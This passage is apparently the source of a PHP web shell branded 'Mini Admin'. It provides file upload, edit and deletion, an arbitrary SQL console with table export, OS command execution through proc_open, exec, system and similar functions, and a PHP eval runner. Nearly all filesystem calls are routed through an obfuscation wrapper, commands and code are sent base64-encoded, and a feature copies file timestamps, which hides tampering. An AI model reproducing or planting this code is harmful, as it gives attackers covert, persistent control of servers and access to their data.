    }
    if (!Obf::call('rename', $source, $target)) {
      return false;
    }
    Obf::call('clearstatcache', true, $source);
    Obf::call('clearstatcache', true, $target);
    return self::rel($target);
  }

  public static function delete($rel) {
    if ($rel === '') {
      return false;
    }
    $path = self::resolve($rel);
    if ($path === false) {
      return false;
    }
    if (!self::deletePath($path)) {
      return false;
    }
    Obf::call('clearstatcache', true, $path);
    return !self::pathExists($path);
  }

  public static function upload($rel, $file) {
    $error = isset($file['error']) ? $file['error'] : UPLOAD_ERR_NO_FILE;
    if (!is_array($file) || $error !== UPLOAD_ERR_OK) {
      return false;
    }
    $name = self::safeName((string)$file['name']);
    if ($name === '') {
      return false;
    }
    $base = self::resolve($rel);
    if ($base === false || !Obf::call('is_dir', $base)) {
      return false;
    }
    $target = self::resolve(self::joinPath($rel, $name));
    if ($target === false) {
      return false;
    }
    return Obf::call('move_uploaded_file', $file['tmp_name'], $target);
  }

  public static function download($rel) {
    $path = self::resolve($rel);
    if ($path === false || !Obf::call('is_file', $path)) {
      return;
    }
    $name = basename($path);
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . $name . '"');
    header('Content-Length: ' . Obf::call('filesize', $path));
    Obf::call('readfile', $path);
  }

  private static function itemInfo($rel) {
    if ($rel === '') {
      return null;
    }
    $path = self::resolve($rel);
    if ($path === false || (!Obf::call('file_exists', $path) && !Obf::call('is_link', $path))) {
      return null;
    }
    Obf::call('clearstatcache', true, $path);
    $mtime = Obf::call('filemtime', $path);
    $name = basename(rtrim($path, '/'));
    if ($name === '') {
      $name = $path;
    }
    return [
      'name' => $name,
      'rel' => self::rel($path),
      'path' => $path,
      'is_dir' => Obf::call('is_dir', $path),
      'mtime' => $mtime === false ? null : (int)$mtime,
    ];
  }

  private static function setTime($rel, $timestamp) {
    if ($rel === '') {
      return false;
    }
    $path = self::resolve($rel);
    if ($path === false || (!Obf::call('file_exists', $path) && !Obf::call('is_link', $path))) {
      return false;
    }
    $atime = Obf::call('fileatime', $path);
    if ($atime === false) {
      $atime = $timestamp;
    }
    $ok = Obf::call('touch', $path, $timestamp, $atime);
    if (!$ok) {
      $ok = Obf::call('touch', $path, $timestamp, $timestamp);
    }
    if ($ok) {
      Obf::call('clearstatcache', true, $path);
    }
    return $ok;
  }

  private static function formatItemLabel($rel, $info = null) {
    $type = 'Item';
    $path = trim((string)$rel);
    if (is_array($info)) {
      $type = !empty($info['is_dir']) ? 'Folder' : 'File';
      $path = isset($info['rel']) ? trim((string)$info['rel']) : $path;
    }
    if ($path === '') {
      $path = '(unknown)';
    }
    return $type . ': ' . $path;
  }

  private static function summarizeItemList($items, $limit = 20) {
    if (!is_array($items) || empty($items)) {
      return '- None';
    }
    $lines = [];
    $total = count($items);
    $shown = array_slice($items, 0, $limit);
    foreach ($shown as $item) {
      $lines[] = '- ' . $item;
    }
    if ($total > $limit) {
      $lines[] = '- ... and ' . ($total - $limit) . ' more item(s)';
    }
    return implode("\n", $lines);
  }

  private static function copyTime($targetRel, $sourceRel) {
    $source = self::itemInfo($sourceRel);
    if ($source === null || $source['mtime'] === null) {
      return false;
    }
    return self::setTime($targetRel, $source['mtime']);
  }

  private static function parseTimeInput($value) {
    $value = trim((string)$value);
    if ($value === '') {
      return false;
    }
    $value = str_replace('T', ' ', $value);
    $timestamp = strtotime($value);
    return $timestamp === false ? false : (int)$timestamp;
  }

  private static function redirectParams($cwd, $timeTarget = '', $timeSource = '') {
    $params = ['p' => App::enc($cwd)];
    if ($timeTarget !== '') {
      $params['time_target'] = App::enc($timeTarget);
    }
    if ($timeSource !== '') {
      $params['time_source'] = App::enc($timeSource);
    }
    return $params;
  }

  private static function normalizePath($path) {
    $path = str_replace("\0", '', (string)$path);
    $path = str_replace('\\', '/', $path);
    $path = trim($path);
    if (preg_match('/^[A-Za-z]:$/', $path)) {
      $path .= '/';
    }
    return $path;
  }

  private static function pathExists($path) {
    return Obf::call('file_exists', $path) || Obf::call('is_link', $path);
  }

  private static function deletePath($path) {
    if (Obf::call('is_link', $path) || Obf::call('is_file', $path)) {
      return Obf::call('unlink', $path);
    }
    if (!Obf::call('is_dir', $path)) {
      return false;
    }
    $items = Obf::call('scandir', $path);
    if ($items === false) {
      return false;
    }
    foreach ($items as $item) {
      if ($item === '.' || $item === '..') {
        continue;
      }
      if (!self::deletePath($path . '/' . $item)) {
        return false;
      }
    }
    return Obf::call('rmdir', $path);
  }

  private static function joinPath($base, $name) {
    $base = rtrim(self::normalizePath($base), '/');
    if ($base === '') {
      return $name;
    }
    return $base . '/' . $name;
  }

  public static function parentRel($rel) {
    $rel = rtrim(self::normalizePath($rel), '/');
    if ($rel === '' || $rel === '.' || $rel === '/' || preg_match('/^[A-Za-z]:$/', $rel)) {
      return false;
    }
    $pos = strrpos($rel, '/');
    if ($pos === false) {
      return '';
    }
    if ($pos === 0) {
      return '/';
    }
    $parent = substr($rel, 0, $pos);
    if (preg_match('/^[A-Za-z]:$/', $parent)) {
      $parent .= '/';
    }
    return $parent;
  }

  private static function isAbsolutePath($path) {
    if ($path === '') {
      return false;
    }
    if (strpos($path, '//') === 0 || strpos($path, '/') === 0) {
      return true;
    }
    return (bool)preg_match('/^[A-Za-z]:\//', $path);
  }

  private static function safeName($name) {
    $name = trim(str_replace(["\0", "\r", "\n"], '', (string)$name));
    if ($name === '' || $name === '.' || $name === '..') {
      return '';
    }
    if (strpos($name, '/') !== false || strpos($name, '\\') !== false) {
      return '';
    }
    return $name;
  }
}

class DB {
  public static function handle() {
    $data = [
      'enabled' => true,
      'error' => '',
      'dbs' => [],
      'tables' => [],
      'db' => '',
      'table' => '',
      'rows' => [],
      'sql' => '',
      'sql_result' => null,
      'sql_error' => '',
      'sql_ran' => false,
      'cfg' => [],
    ];

    $action = (string)App::param('action', '');
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && in_array($action, ['connect', 'disconnect'], true)) {
      if (!App::checkCsrf()) {
        App::flash('Invalid token.', 'error');
        App::redirect('db');
      }
      if ($action === 'disconnect') {
        self::clearCfg();
        App::flash('DB settings cleared.', 'info');
        App::redirect('db');
      }
      $current = self::cfg();
      $next = [
        'host' => trim((string)App::param('host', isset($current['host']) ? $current['host'] : '')),
        'port' => trim((string)App::param('port', isset($current['port']) ? $current['port'] : '')),
        'user' => trim((string)App::param('user', isset($current['user']) ? $current['user'] : '')),
        'pass' => (string)App::param('pass', ''),
        'name' => trim((string)App::param('name', isset($current['name']) ? $current['name'] : '')),
      ];
      if ($next['pass'] === '' && isset($current['pass'])) {
        $next['pass'] = (string)$current['pass'];
      }
      self::setCfg($next);
      App::flash('DB settings updated.', 'success');
      App::redirect('db');
    }

    $cfg = self::cfg();
    $data['cfg'] = $cfg;
    if (!self::enabled()) {
      $data['enabled'] = false;
      $data['error'] = 'PDO not available.';
      return $data;
    }
    if (empty($cfg['host']) || empty($cfg['user'])) {
      $data['enabled'] = false;
      $data['error'] = 'DB config missing.';
      return $data;
    }

    try {
      $pdoRoot = self::pdo();
    } catch (Exception $e) {
      $data['enabled'] = false;
      $data['error'] = $e->getMessage();
      return $data;
    }

    $dbs = self::listDatabases($pdoRoot);
    $data['dbs'] = $cfg['name'] !== '' ? [$cfg['name']] : $dbs;
    $fallbackDb = isset($data['dbs'][0]) ? $data['dbs'][0] : '';
    $data['db'] = (string)App::param('db', $cfg['name'] !== '' ? $cfg['name'] : $fallbackDb, true);
    if ($data['db'] !== '' && !self::safeName($data['db'])) {
      $data['error'] = 'Invalid database name.';
      return $data;
    }

    $tables = $data['db'] !== '' ? self::listTables($pdoRoot, $data['db']) : [];
    $data['tables'] = $tables;
    $fallbackTable = isset($tables[0]) ? $tables[0] : '';
    $data['table'] = (string)App::param('table', $fallbackTable, true);
    if ($data['table'] !== '' && !self::safeName($data['table'])) {
      $data['error'] = 'Invalid table name.';
      return $data;
    }
    if ($data['table'] !== '' && !in_array($data['table'], $tables, true)) {
      $data['table'] = isset($tables[0]) ? $tables[0] : '';
    }
    $tableValid = $data['table'] !== '' && in_array($data['table'], $tables, true);

    if ($action === 'export' && $data['db'] !== '' && $tableValid) {
      self::exportCsv($data['db'], $data['table']);
      exit;
    }

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && $action === 'sql') {
      $data['sql_ran'] = true;
      if (!App::checkCsrf()) {
        App::flash('Invalid token.', 'error');
        App::redirect('db', ['db' => App::enc($data['db']), 'table' => App::enc($data['table'])]);
      }
      $sql = trim((string)App::param('sql', ''));
      if ($sql !== '' && $data['table'] !== '' && preg_match('/^\s*select\b/i', $sql) && !preg_match('/\bfrom\b/i', $sql)) {
        $sql = rtrim($sql, ";\r\n\t ") . ' FROM ' . self::quoteName($data['table']);
      }
      $data['sql'] = $sql;
      if ($sql !== '') {
        try {
          $data['sql_result'] = self::runSql($data['db'], $sql);
        } catch (Exception $e) {
          $data['sql_error'] = $e->getMessage();
        }
      }
    }

    if ($data['db'] !== '' && $tableValid) {
      try {
        $data['rows'] = self::listRows($data['db'], $data['table'], 50);
      } catch (Exception $e) {
        $data['error'] = $e->getMessage();
      }
    }

    return $data;
  }

  public static function enabled() {
    return class_exists('PDO');
  }

  public static function pdo($dbName = null) {
    $cfg = self::cfg();
    $dsn = 'mysql:host=' . $cfg['host'] . ';charset=utf8mb4';
    if (!empty($cfg['port']) && ctype_digit((string)$cfg['port'])) {
      $dsn .= ';port=' . (string)$cfg['port'];
    }
    if (!empty($dbName)) {
      $dsn .= ';dbname=' . $dbName;
    }
    return new PDO($dsn, $cfg['user'], $cfg['pass'], [
      PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
      PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ]);
  }

  public static function listDatabases(PDO $pdo) {
    $rows = $pdo->query('SHOW DATABASES')->fetchAll(PDO::FETCH_COLUMN);
    return is_array($rows) ? $rows : [];
  }

  public static function listTables(PDO $pdo, $db) {
    if (!self::safeName($db)) {
      return [];
    }
    $rows = $pdo->query('SHOW TABLES FROM ' . self::quoteName($db))->fetchAll(PDO::FETCH_COLUMN);
    return is_array($rows) ? $rows : [];
  }

  public static function listRows($db, $table, $limit) {
    if (!self::safeName($db) || !self::safeName($table)) {
      return [];
    }
    $pdo = self::pdo($db);
    $sql = 'SELECT * FROM ' . self::quoteName($db) . '.' . self::quoteName($table) . ' LIMIT ' . (int)$limit;
    return $pdo->query($sql)->fetchAll(PDO::FETCH_ASSOC);
  }

  public static function exportCsv($db, $table) {
    if (!self::safeName($db) || !self::safeName($table)) {
      return;
    }
    $pdo = self::pdo($db);
    $stmt = $pdo->query('SELECT * FROM ' . self::quoteName($db) . '.' . self::quoteName($table));
    $name = $db . '_' . $table . '.csv';
    header('Content-Type: text/csv');
    header('Content-Disposition: attachment; filename="' . $name . '"');
    $out = Obf::call('fopen', 'php://output', 'w');
    $first = true;
    while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
      if ($first) {
        Obf::call('fputcsv', $out, array_keys($row));
        $first = false;
      }
      Obf::call('fputcsv', $out, $row);
    }
    Obf::call('fclose', $out);
  }

  public static function runSql($db, $sql) {
    $pdo = self::pdo($db !== '' ? $db : null);
    if (preg_match('/^\s*select/i', $sql)) {
      $stmt = $pdo->query($sql);
      return ['type' => 'select', 'rows' => $stmt->fetchAll(PDO::FETCH_ASSOC)];
    }
    $count = $pdo->exec($sql);
    return ['type' => 'exec', 'count' => $count];
  }

  private static function safeName($name) {
    return (bool)preg_match('/^[A-Za-z0-9_]+$/', (string)$name);
  }

  private static function quoteName($name) {
    return '`' . str_replace('`', '``', (string)$name) . '`';
  }

  private static function cfg() {
    $cfg = App::config('db');
    if (!is_array($cfg)) {
      $cfg = [];
    }
    $session = isset($_SESSION['db_cfg']) ? $_SESSION['db_cfg'] : null;
    if (is_array($session)) {
      $cfg = array_merge($cfg, $session);
    }
    $allowed = ['host', 'port', 'user', 'pass', 'name'];
    $filtered = [];
    foreach ($allowed as $key) {
      $filtered[$key] = isset($cfg[$key]) ? $cfg[$key] : '';
    }
    return $filtered;
  }

  private static function setCfg(array $cfg) {
    $allowed = ['host', 'port', 'user', 'pass', 'name'];
    $filtered = [];
    foreach ($allowed as $key) {
      $filtered[$key] = isset($cfg[$key]) ? $cfg[$key] : '';
    }
    $_SESSION['db_cfg'] = $filtered;
  }

  private static function clearCfg() {
    unset($_SESSION['db_cfg']);
  }
}

class Editor {
  public static function handle() {
    $file = (string)App::param('file', '', true);
    $data = [
      'file' => $file,
      'content' => '',
      'error' => '',
    ];

    if ($file === '') {
      $data['error'] = 'No file selected.';
      return $data;
    }

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && App::param('action') === 'save') {
      if (!App::checkCsrf()) {
        App::flash('Invalid token.', 'error');
        App::redirect('editor', ['file' => App::enc($file)]);
      }
      if (!array_key_exists('content_enc', $_POST)) {
        App::flash('Encrypted content missing.', 'error');
        App::redirect('editor', ['file' => App::enc($file)]);
      }
      $contentEnc = (string)$_POST['content_enc'];
      $content = Crypto::dec($contentEnc);
      if ($content === false) {
        App::flash('Encrypted content invalid.', 'error');
        App::redirect('editor', ['file' => App::enc($file)]);
      }
      if (self::save($file, $content)) {
        App::flash('Saved.', 'success');
      } else {
        App::flash('Save failed.', 'error');
      }
      App::redirect('editor', ['file' => App::enc($file)]);
    }

    $loaded = self::load($file);
    if (!$loaded['ok']) {
      $data['error'] = $loaded['error'];
      return $data;
    }
    $data['content'] = $loaded['content'];
    return $data;
  }

  public static function load($rel) {
    $path = Files::resolve($rel);
    if ($path === false || !Obf::call('is_file', $path)) {
      return ['ok' => false, 'content' => '', 'error' => 'File not found.'];
    }
    $max = (int)App::config('max_edit_bytes');
    if ($max > 0 && Obf::call('filesize', $path) > $max) {
      return ['ok' => false, 'content' => '', 'error' => 'File too large to edit.'];
    }
    $content = Obf::call('file_get_contents', $path);
    if ($content === false) {
      return ['ok' => false, 'content' => '', 'error' => 'Failed to read file.'];
    }
    return ['ok' => true, 'content' => $content, 'error' => ''];
  }

  public static function save($rel, $content) {
    $path = Files::resolve($rel);
    if ($path === false || Obf::call('is_dir', $path)) {
      return false;
    }
    return Obf::call('file_put_contents', $path, $content) !== false;
  }
}

class Cmd {
  public static function handle() {
    $methods = self::availableMethods();
    $data = [
      'enabled' => App::config('enable_cmd'),
      'supported' => !empty($methods),
      'methods' => $methods,
      'method' => '',
      'output' => '',
      'exit_code' => null,
      'cmd' => '',
      'error' => '',
    ];

    if (!$data['enabled']) {
      return $data;
    }
    if (!$data['supported']) {
      $data['error'] = 'Command execution not supported.';
      return $data;
    }

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && App::param('action') === 'run') {
      if (!App::checkCsrf()) {
        App::flash('Invalid token.', 'error');
        App::redirect('cmd');
      }
      if (!array_key_exists('cmd_enc', $_POST)) {
        $data['error'] = 'Encrypted command missing.';
        return $data;
      }
      $cmd = Crypto::dec((string)$_POST['cmd_enc']);
      if ($cmd === false) {
        $data['error'] = 'Encrypted command invalid.';
        return $data;
      }
      $cmd = trim((string)$cmd);
      $data['cmd'] = $cmd;
      if ($cmd === '') {
        $data['error'] = 'No command provided.';
        return $data;
      }
      $result = self::run($cmd);
      $data['output'] = $result['output'];
      $data['exit_code'] = $result['exit_code'];
      $data['method'] = $result['method'];
    }

    return $data;
  }

  public static function can() {
    return !empty(self::availableMethods());
  }

  public static function availableMethods() {
    $disabled = array_filter(array_map('trim', explode(',', (string)ini_get('disable_functions'))));
    $methods = [];
    foreach (['proc_open', 'exec', 'shell_exec', 'system', 'passthru'] as $fn) {
      if (function_exists($fn) && !in_array($fn, $disabled, true)) {
        $methods[] = $fn;
      }
    }
    return $methods;
  }

  public static function run($cmd) {
    $methods = self::availableMethods();
    $prepared = self::prepareCommand($cmd);
    foreach ($methods as $method) {
      if ($method === 'proc_open') {
        $spec = [
          0 => ['pipe', 'r'],
          1 => ['pipe', 'w'],
          2 => ['pipe', 'w'],
        ];
        $process = proc_open($prepared, $spec, $pipes);
        if (is_resource($process)) {
          fclose($pipes[0]);
          $stdout = stream_get_contents($pipes[1]);
          $stderr = stream_get_contents($pipes[2]);
          fclose($pipes[1]);
          fclose($pipes[2]);
          $exit = proc_close($process);
          return [
            'output' => self::normalizeOutput((string)$stdout . (string)$stderr),
            'exit_code' => $exit,
            'method' => 'proc_open',
          ];
        }
      }
      if ($method === 'exec') {
        $output = [];
        $exit = 0;
        exec($prepared . ' 2>&1', $output, $exit);
        return [
          'output' => self::normalizeOutput(implode("\n", $output)),
          'exit_code' => $exit,
          'method' => 'exec',
        ];
      }
      if ($method === 'shell_exec') {
        $out = shell_exec($prepared . ' 2>&1');
        return [
          'output' => self::normalizeOutput((string)$out),
          'exit_code' => null,
          'method' => 'shell_exec',
        ];
      }
      if ($method === 'system') {
        $exit = 0;
        ob_start();
        system($prepared . ' 2>&1', $exit);
        $out = ob_get_clean();
        return [
          'output' => self::normalizeOutput((string)$out),
          'exit_code' => $exit,
          'method' => 'system',
        ];
      }
      if ($method === 'passthru') {
        $exit = 0;
        ob_start();
        passthru($prepared . ' 2>&1', $exit);
        $out = ob_get_clean();
        return [
          'output' => self::normalizeOutput((string)$out),
          'exit_code' => $exit,
          'method' => 'passthru',
        ];
      }
    }
    return [
      'output' => '',
      'exit_code' => null,
      'method' => 'none',
    ];
  }

  private static function prepareCommand($cmd) {
    $cmd = trim((string)$cmd);
    $os = defined('PHP_OS_FAMILY') ? PHP_OS_FAMILY : PHP_OS;
    if (stripos($os, 'Windows') !== false && !preg_match('/^\s*cmd\s+\/c\s+/i', $cmd)) {
      return 'cmd /c ' . $cmd;
    }
    return $cmd;
  }

  private static function normalizeOutput($text) {
    $text = (string)$text;
    if ($text === '') {
      return $text;
    }
    if (function_exists('mb_check_encoding') && mb_check_encoding($text, 'UTF-8')) {
      return $text;
    }
    if (function_exists('mb_detect_encoding')) {
      $enc = mb_detect_encoding($text, ['UTF-8', 'GBK', 'CP936', 'BIG5', 'CP1252', 'ISO-8859-1'], true);
      if ($enc && strtoupper($enc) !== 'UTF-8') {
        $converted = @mb_convert_encoding($text, 'UTF-8', $enc);
        if ($converted !== false) {
          return $converted;
        }
      }
    }
    if (function_exists('iconv')) {
      $converted = @iconv('GBK', 'UTF-8//IGNORE', $text);
      if ($converted !== false && $converted !== '') {
        return $converted;
      }
    }
    return $text;
  }
}

class PhpExec {
  public static function handle() {
    $data = [
      'code' => '',
      'output' => '',
      'return' => '',
      'error' => '',
      'ran' => false,
    ];

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && App::param('action') === 'run') {
      if (!App::checkCsrf()) {
        App::flash('Invalid token.', 'error');
        App::redirect('php');
      }
      if (!array_key_exists('code_enc', $_POST)) {
        $data['error'] = 'Encrypted code missing.';
        return $data;
      }
      $code = Crypto::dec((string)$_POST['code_enc']);
      if ($code === false) {
        $data['error'] = 'Encrypted code invalid.';
        return $data;
      }
      $code = self::normalizeCode((string)$code);
      if ($code === '') {
        $data['error'] = 'No code provided.';
        return $data;
      }
      $data['code'] = $code;
      $data['ran'] = true;

      $output = '';
      $result = null;
      if (defined('PHP_VERSION_ID') && PHP_VERSION_ID >= 70000) {
        try {
          ob_start();
          $result = eval($code);
          $output = ob_get_clean();
        } catch (Throwable $e) {
          $output = ob_get_clean();
          $data['error'] = $e->getMessage();
        }
      } else {
        try {
          ob_start();
          $result = eval($code);
          $output = ob_get_clean();
        } catch (Exception $e) {
          $output = ob_get_clean();
          $data['error'] = $e->getMessage();
        }
      }
      $data['output'] = (string)$output;
      if ($data['error'] === '') {
        $data['return'] = var_export($result, true);
      }
    }

    return $data;
  }

  private static function normalizeCode($code) {
    $code = preg_replace('/^\s*<\?php/i', '', $code);
    $code = preg_replace('/\?>\s*$/', '', $code);
    return trim((string)$code);
  }
}

class UI {
  public static function layout($title, $route, $body) {
    App::noCache();
    $user = Auth::user();
    $flash = App::flash();
    $runtimeErrors = App::runtimeErrors();
    $nav = self::navItems();
    App::csrfToken();
    ?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title><?php echo App::h($title); ?></title>
  <script>
    window.fmCrypto = window.fmCrypto || (function () {
      function utf8ToBinary(input) {
        if (typeof TextEncoder !== 'undefined') {
          var bytes = new TextEncoder().encode(String(input || ''));
          var binary = '';
          for (var i = 0; i < bytes.length; i++) {
            binary += String.fromCharCode(bytes[i]);
          }
          return binary;
        }
        return unescape(encodeURIComponent(String(input || '')));
      }
      function binaryToUtf8(binary) {
        if (typeof TextDecoder !== 'undefined') {
          var bytes = new Uint8Array(binary.length);
          for (var i = 0; i < binary.length; i++) {
            bytes[i] = binary.charCodeAt(i);
          }
          return new TextDecoder().decode(bytes);
        }
        return decodeURIComponent(escape(binary));
      }
      function enc(input) {
        var b64 = btoa(utf8ToBinary(input));
        return b64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/g, '');
      }
      function dec(input) {
        var b64 = String(input || '').replace(/-/g, '+').replace(/_/g, '/');
        var pad = b64.length % 4;
        if (pad) {
          b64 += '='.repeat(4 - pad);
        }
        return binaryToUtf8(atob(b64));
      }
      return { enc: enc, dec: dec };
    })();
  </script>
  <style>
    :root {
      --bg: #f6f1e7;
      --bg-2: #e7f1f0;
      --ink: #1f2933;
      --muted: #5b6675;
      --line: #e5dfd5;
      --card: #ffffff;
      --accent: #c2410c;
      --accent-2: #0f766e;
      --nav: #1f2a38;
      --nav-soft: #2a3a4f;
    }
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: "Palatino Linotype", "Book Antiqua", Palatino, Georgia, serif;
      color: var(--ink);
      background: linear-gradient(120deg, var(--bg), var(--bg-2) 60%, #f9f7f2);
      min-height: 100vh;
      position: relative;
    }
    body::before {
      content: "";
      position: fixed;
      inset: 0;
      background-image:
        radial-gradient(circle at 20% 20%, rgba(194, 65, 12, 0.08), transparent 40%),
        radial-gradient(circle at 80% 10%, rgba(15, 118, 110, 0.10), transparent 45%),
        radial-gradient(circle at 10% 85%, rgba(194, 65, 12, 0.06), transparent 35%);
      pointer-events: none;
      z-index: 0;
    }
    .topbar {
      position: relative;
      z-index: 1;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 14px 22px;
      background: linear-gradient(90deg, #1f2933, #2f3d4f);
      color: #f8fafc;
      box-shadow: 0 6px 14px rgba(31, 41, 51, 0.2);
    }
    .logo { font-weight: 700; letter-spacing: 0.8px; text-transform: uppercase; font-size: 14px; }
    .user { display:flex; align-items:center; gap:12px; }
    .user form, .sidebar form, .path form, .table-actions form.inline-post, .tag-form { margin:0; display:inline; }
    .user-action, .nav-link-btn, .path-link-btn, .tag-button {
      border:0;
      cursor:pointer;
      font:inherit;
    }
    .user-action { color: #fde68a; text-decoration: none; background: transparent; padding: 0; }
    .layout { position: relative; z-index: 1; display: flex; min-height: calc(100vh - 56px); }
    .sidebar {
      width: 210px;
      background: var(--nav);
      padding: 16px 12px;
      border-right: 1px solid rgba(255, 255, 255, 0.06);
    }
    .nav-link-btn {
      display: block;
      width: 100%;
      padding: 10px 12px;
      color: #d1d5db;
      background: transparent;
      text-align: left;
      border-radius: 10px;
      margin-bottom: 6px;
      transition: background 0.2s ease, color 0.2s ease;
    }
    .nav-link-btn.active, .nav-link-btn:hover { background: var(--nav-soft); color: #fff; }
    .main { flex: 1; padding: 24px; }
    .main h1 { margin: 0 0 16px 0; font-size: 28px; letter-spacing: 0.4px; animation: fadeIn 0.4s ease; }
    .card {
      background: var(--card);
      border-radius: 14px;
      padding: 18px;
      border: 1px solid rgba(31, 41, 51, 0.08);
      box-shadow: 0 12px 26px rgba(31, 41, 51, 0.08);
      margin-bottom: 18px;
      animation: cardIn 0.5s ease both;
    }
    details.collapse > summary {
      cursor: pointer;
      font-weight: 600;
      color: #1f2a38;
      margin-bottom: 12px;
      list-style: none;
    }
    details.collapse > summary::-webkit-details-marker { display: none; }
    .card:nth-of-type(2) { animation-delay: 0.05s; }
    .card:nth-of-type(3) { animation-delay: 0.1s; }
    .flash { padding: 10px 12px; border-radius: 10px; margin-bottom: 12px; white-space: pre-line; }
    .flash.success { background: #ecfdf3; color: #046c4e; }
    .flash.warning { background: #fff7ed; color: #c2410c; }
    .flash.error { background: #fef2f2; color: #b91c1c; }
    .flash.info { background: #eff6ff; color: #1d4ed8; }
    table { width: 100%; border-collapse: collapse; }
    th, td { padding: 9px 10px; text-align: left; border-bottom: 1px solid var(--line); }
    th { font-weight: 600; color: #374151; background: #f7f1e7; }
    .muted { color: var(--muted); }
    .time-panel { display: grid; grid-template-columns: minmax(0, 1.1fr) minmax(260px, 0.9fr); gap: 18px; align-items: start; }
    .time-panel form { display: block; margin: 0; }
    .time-panel input[type="datetime-local"] { width: 100%; }
    .time-box {
      padding: 12px 14px;
      border: 1px solid rgba(31, 41, 51, 0.08);
      border-radius: 12px;
      background: linear-gradient(180deg, #fffdf9, #f9f7f2);
      margin-bottom: 12px;
    }
    .time-box strong { display: block; margin-bottom: 4px; }
    .time-meta { font-size: 13px; color: var(--muted); line-height: 1.5; }
    .time-row-active td { background: rgba(194, 65, 12, 0.08); }
    .time-row-source td { background: rgba(15, 118, 110, 0.08); }
    .table-actions { display: flex; flex-wrap: wrap; gap: 6px; align-items: center; }
    .table-actions form { margin: 0; }
    .actions form { display: inline-block; margin: 6px 8px 6px 0; }
    .actions input[type="text"] { width: 1700px; }
    .actions input, .actions select, .actions textarea, .actions button {
      padding: 7px 10px;
      border: 1px solid #d2c7b9;
      border-radius: 8px;
      background: #fffdf9;
    }
    .actions button {
      background: linear-gradient(135deg, var(--accent), #f59e0b);
      border: none;
      color: #fff;
      cursor: pointer;
      transition: transform 0.15s ease, box-shadow 0.15s ease;
    }
    .actions button:hover { transform: translateY(-1px); box-shadow: 0 6px 16px rgba(194, 65, 12, 0.2); }
    .actions button.secondary { background: linear-gradient(135deg, #64748b, #475569); }
    .tag {
      display: inline-block;
      padding: 3px 8px;
      border-radius: 999px;
      background: rgba(15, 118, 110, 0.12);
      color: #0f766e;
      font-size: 12px;
      text-decoration: none;
    }
    .tag-button {
      display: inline-block;
      padding: 3px 8px;
      border-radius: 999px;
      background: rgba(15, 118, 110, 0.12);
      color: #0f766e;
      font-size: 12px;
      text-decoration: none;
    }
    .file-edit-backdrop {
      position: fixed;
      inset: 0;
      z-index: 20;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 24px;
      background: rgba(31, 41, 51, 0.52);
    }
    .file-edit-modal {
      width: min(1100px, 96vw);
      max-height: 92vh;
      display: flex;
      flex-direction: column;
      background: #fffdf9;
      border: 1px solid rgba(31, 41, 51, 0.12);
      border-radius: 14px;
      box-shadow: 0 24px 60px rgba(31, 41, 51, 0.28);
      overflow: hidden;
    }
    .file-edit-header {
      padding: 14px 16px;
      border-bottom: 1px solid var(--line);
      background: #f7f1e7;
    }
    .file-edit-title { font-weight: 700; margin-bottom: 4px; }
    .file-edit-path {
      color: var(--muted);
      font-size: 13px;
      word-break: break-all;
    }
    .file-edit-form { display: flex; flex-direction: column; min-height: 0; }
    .file-edit-form textarea {
      min-height: 54vh;
      max-height: 64vh;
      margin: 0;
      border: 0;
      border-radius: 0;
      resize: vertical;
    }
    .file-edit-actions {
      display: flex;
      justify-content: flex-end;
      gap: 10px;
      padding: 12px 16px 16px;
      background: #fffdf9;
    }
    .file-edit-cancel-form { display: none; }
    textarea { width: 100%; min-height: 320px; font-family: "Consolas", "Courier New", monospace; background: #fbf8f2; }
    pre { background: #111827; color: #e5e7eb; padding: 12px; border-radius: 10px; overflow: auto; }
    .path { margin-bottom: 12px; }
    .path-link-btn { color: #0f766e; text-decoration: none; background: transparent; padding: 0; }
    @keyframes cardIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    @media (max-width: 900px) {
      .layout { flex-direction: column; }
      .sidebar { width: 100%; display: flex; overflow-x: auto; }
      .nav-link-btn { white-space: nowrap; margin-right: 8px; }
      .main { padding: 18px; }
      .time-panel { grid-template-columns: 1fr; }
    }
  </style>
</head>
<body>
  <div class="topbar">
    <div class="logo">Mini Admin</div>
    <div class="user">
      <?php echo App::h($user); ?>
      <form method="post" action="<?php echo App::h(App::selfPath()); ?>">
        <input type="hidden" name="r" value="logout">
        <button type="submit" class="user-action">Logout</button>
      </form>
    </div>
  </div>
  <div class="layout">
    <nav class="sidebar">
      <?php foreach ($nav as $key => $label): ?>
        <form method="post" action="<?php echo App::h(App::selfPath()); ?>">
          <input type="hidden" name="r" value="<?php echo App::h($key); ?>">
          <button type="submit" class="nav-link-btn <?php echo $key === $route ? 'active' : ''; ?>"><?php echo App::h($label); ?></button>
        </form>
      <?php endforeach; ?>
    </nav>
    <main class="main">
      <h1><?php echo App::h($title); ?></h1>
      <?php if (!empty($runtimeErrors)): ?>
        <?php foreach ($runtimeErrors as $err): ?>
          <div class="flash error"><?php echo App::h($err); ?></div>
        <?php endforeach; ?>
      <?php endif; ?>
      <?php if ($flash): ?>
        <div class="flash <?php echo App::h($flash['type']); ?>"><?php echo App::h($flash['msg']); ?></div>
      <?php endif; ?>
      <?php echo $body; ?>
    </main>
  </div>
</body>
</html>
    <?php
  }

  public static function login() {
    App::noCache();
    $flash = App::flash();
    $csrf = App::csrfToken();
    ?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Login</title>
  <style>
    :root {
      --bg: #f6f1e7;
      --bg-2: #e7f1f0;
      --ink: #1f2933;
      --muted: #5b6675;
      --line: #e5dfd5;
      --card: #ffffff;
      --accent: #c2410c;
    }
    * { box-sizing: border-box; }
